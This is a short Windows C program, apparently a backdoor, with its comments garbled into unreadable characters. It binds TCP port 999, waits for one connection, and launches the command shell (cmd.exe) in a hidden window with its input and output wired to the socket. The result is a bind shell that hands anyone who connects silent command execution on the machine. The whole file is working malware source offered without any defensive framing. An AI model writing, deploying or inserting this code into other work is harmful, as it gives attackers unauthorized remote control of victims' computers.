#pragma comment(lib,"ws2_32.lib")
#pragma comment(llinker,"subsystem:windows/entry:mainCRTStartup")
#include<winsock2.h>
#include<windows.h>
#define MasterPort 999//��������˿�999
int main() {

	WSADATA WSADa;
	sockaddr_in SockAddrIn;
	SOCKET CSocket, SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[255];

	//�����ڴ���Դ����ʼ������
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));

	//��ȡcmd·��
	GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

	//����ws2_32.dll
	WSAStartup(0x0202, &WSADa);

	//���ñ�����Ϣ�Ͱ�Э�飬����socket
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(MasterPort);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//���ð󶨶˿�999��
	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));

	//���÷������˼����˿ڣ�
	listen(CSocket, 1);

	//��ʼ����Զ�̷�����
	iAddrSize = sizeof(SockAddrIn);
	SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
	
	//�������ش��ڽṹ��
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;

	//���������ܵ�:
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);

	//�رս��̾����
	closesocket(CSocket);
	closesocket(SSocket);
	
	//�ر�����ж��ws2_32.dll
	WSACleanup();
	
	return 0;

}